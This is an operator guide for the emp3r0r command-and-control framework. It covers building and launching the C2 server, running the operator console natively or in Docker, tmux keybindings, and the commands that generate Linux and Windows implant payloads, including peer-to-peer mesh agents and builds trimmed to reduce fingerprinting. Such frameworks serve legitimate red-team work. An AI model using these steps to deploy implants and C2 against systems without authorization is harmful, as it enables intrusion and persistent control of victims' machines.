# Operator Guide

This guide covers the full emp3r0r deployment: building and launching the C2
server, installing and running the operator console (natively on Linux or from
a container -- the recommended path on Windows), and generating agent payloads.
The console is driven through a tmux session, so its keybindings are documented
below as well.

The C2 server is a standalone deployment: it publishes random public ports, so
it is intentionally not containerized.

## Quick Start

### 1. C2 Server Installation

Building emp3r0r requires Docker or Podman on the host -- no local Go toolchain.

```bash
git clone --depth=1 https://github.com/jm33-m0/emp3r0r.git && cd emp3r0r
./install.py
```

The installer builds everything in a throwaway container and prepares the
operator kit. Useful flags: `--lightweight` (Linux/Windows amd64 only, fastest),
`--targets OS/ARCH,...`, `--agent-slim` / `--agent-tags` (trim agent features to
shrink the implant and reduce fingerprinting), `--debug`, `--skip-build`.

Launch the server:

```bash
emp3r0r server --c2-hosts 1.2.3.4 --http-port 12345 --operator-port 13377
```

### 2. Operator Machine Setup

The build produced `core/emp3r0r-operator-kit.tar.zst`. Copy that archive to the
operator machine, then follow one of the two paths below.

#### Linux (native)

```bash
tar --zstd -xpf emp3r0r-operator-kit.tar.zst
cd ./emp3r0r-operator-kit && ./install.py
```

Connect with the WireGuard credentials the server printed:

```bash
emp3r0r client --c2-port 13377 \
  --server-wg-key '<SERVER_WG_KEY>' --server-wg-ip '<SERVER_WG_IP>' \
  --operator-wg-ip '<OPERATOR_WG_IP>' --operator-wg-key '<OPERATOR_WG_KEY>' \
  --c2-host 1.2.3.4
```

#### Windows (container, recommended)

`install.py` is Linux-only, but you do not build the image by hand: running
`./install.py` on the build host builds the operator image and exports it to
`core/emp3r0r-operator-image.tar.zst`. Pass `--no-operator-image` to skip that.

**1. Move the image to the operator machine.** On the build host, after
`./install.py`:

```bash
ls core/emp3r0r-operator-image.tar.zst
```

Copy that `.tar.zst` over however you like (scp, USB, ...), then load it on the
operator machine:

```powershell
docker load -i "emp3r0r-operator-image.tar.zst"
```

**2. Run the console.** Everything (the console, its panes and any shell you
open) lives inside the container's tmux session. Pass the full `emp3r0r`
command -- the image has no entrypoint, so `docker run IMAGE emp3r0r ...` works
exactly like running it on the host:

```powershell
docker run -it --rm -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest `
  emp3r0r client --c2-port 13377 --server-wg-key '<SERVER_WG_KEY>' `
  --server-wg-ip '<SERVER_WG_IP>' --operator-wg-ip '<OPERATOR_WG_IP>' `
  --operator-wg-key '<OPERATOR_WG_KEY>' --c2-host 1.2.3.4
```

- `-it` is required: the client always starts a tmux session and needs a TTY to
  attach. Windows Terminal renders it like any other console.
- The named volume keeps the operator workspace (`~/.emp3r0r`: WireGuard keys,
  generated payloads, logs) across `--rm` runs.
- The container runs as root, so drop `sudo` from any hint the console prints.
- The image is only tagged `latest`; tag the imported image however you like.

If the image was not exported (for example you passed `--no-operator-image`),
you can build it on any Docker host from the kit instead:

```bash
tar --zstd -xpf emp3r0r-operator-kit.tar.zst
cd emp3r0r-operator-kit
docker build -t emp3r0r-operator:latest .
docker save -o emp3r0r-operator-image.tar emp3r0r-operator:latest
zstd -T0 -3 -f emp3r0r-operator-image.tar -o emp3r0r-operator-image.tar.zst
rm -f emp3r0r-operator-image.tar
```

### 3. Generate Agent Payloads

Inside the operator console:

```bash
# Direct C2 agent
generate --type linux_executable --arch amd64 --cc your.domain.com

# Mesh gateway agent (also reachable from the C2 directly)
generate --type linux_executable --arch amd64 --cc your.domain.com \
  --p2p --direct-c2 --p2p-transport mtls

# Mesh intermediate peer (relays for other agents)
generate --type linux_executable --arch amd64 --cc your.domain.com \
  --p2p --p2p-transport mtls --peers 1.2.3.4

# Windows mesh peer over SMB named pipes (local \\.\pipe, cross-host \\host\pipe),
# AES-GCM framed like the other transports
# (requires the Windows SMB stack / logon session to reach the peer)
generate --type windows_executable --arch amd64 --cc your.domain.com \
  --p2p --p2p-transport smb
```

Mesh nodes may run different transports. Each agent advertises the transport and
port its relay listens on, and dialers always use the _peer's_ advertised
transport, so a mixed mesh (for example Windows SMB nodes alongside Linux mTLS
nodes) routes through a peer that shares a usable transport instead of assuming
everyone runs the local default. `smb` is only accepted for Windows payloads;
kcp/mtls work everywhere.

## Container capabilities

The default container run needs no extra privileges: the client's WireGuard runs
entirely in userspace.

### tun2socks

`tun2socks` creates a kernel TUN device and installs routes, so the container
needs `CAP_NET_ADMIN` and access to `/dev/net/tun`:

```powershell
docker run -it --rm --cap-add NET_ADMIN --device /dev/net/tun `
  -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest emp3r0r client ...
```

If Docker Desktop's Linux VM does not expose `/dev/net/tun`, run the operator
natively or start the container with `--privileged`.

### proxy-ns

`proxy-ns` runs each command in its own network namespace with a TUN device and
fake DNS, so it needs several powerful capabilities (`cap_sys_admin`,
`cap_net_admin`, ...). It is unlikely to work in a container without being
privileged:

```powershell
docker run -it --rm --privileged -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest emp3r0r client ...
```

`--privileged` is a large grant. Prefer the native Linux install for
`proxy-ns`, or use the built-in SOCKS5 pivot without it.

## tmux console

The bundled config is at `/usr/local/lib/emp3r0r/tmux/.tmux.conf`; the launcher
starts tmux with `-f` pointing at it.

The prefix is **<kbd>Ctrl</kbd>+<kbd>x</kbd>** (the default <kbd>Ctrl</kbd>+<kbd>b</kbd> is unbound).

| Keys | Action |
| --- | --- |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> | prefix |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>Ctrl</kbd>+<kbd>x</kbd> | send a literal <kbd>Ctrl</kbd>+<kbd>x</kbd> to the program |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>Ctrl</kbd>+<kbd>c</kbd> | new session |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>Ctrl</kbd>+<kbd>f</kbd> | find / switch session |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>_</kbd> | split pane top/bottom |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>-</kbd> | split pane left/right |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>h</kbd>/<kbd>j</kbd>/<kbd>k</kbd>/<kbd>l</kbd> | move left/down/up/right (repeatable) |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>H</kbd>/<kbd>J</kbd>/<kbd>K</kbd>/<kbd>L</kbd> | resize pane (repeatable) |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>&gt;</kbd> / <kbd>&lt;</kbd> | swap pane with next / previous |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>Tab</kbd> | previous window |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>Enter</kbd> | copy mode (vi) |
| <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>b</kbd> / <kbd>p</kbd> / <kbd>P</kbd> | list / paste / choose paste buffer |
| <kbd>Ctrl</kbd>+<kbd>l</kbd> | clear screen and scrollback (no prefix) |
| mouse | enabled (select panes, drag borders) |

In copy mode (vi keys): <kbd>v</kbd> begins a selection,
<kbd>Ctrl</kbd>+<kbd>v</kbd> toggles rectangle selection, <kbd>y</kbd> copies and
exits, <kbd>H</kbd>/<kbd>L</kbd> jump to line start/end, <kbd>Esc</kbd> cancels.

Reload the config with:

```bash
tmux source-file /usr/local/lib/emp3r0r/tmux/.tmux.conf
```

(The <kbd>Ctrl</kbd>+<kbd>x</kbd> <kbd>r</kbd> binding sources `~/.tmux.conf`, which
the container does not create.)

## Workspace

The operator workspace is `~/.emp3r0r` (override with `EMP3R0R_WORKSPACE`). It
holds `emp3r0r.json`, the WireGuard keys, `file-get/` downloads, generated
payloads and `emp3r0r.log`. Mount it (or use a named volume) if you want this
state to survive container recreation.
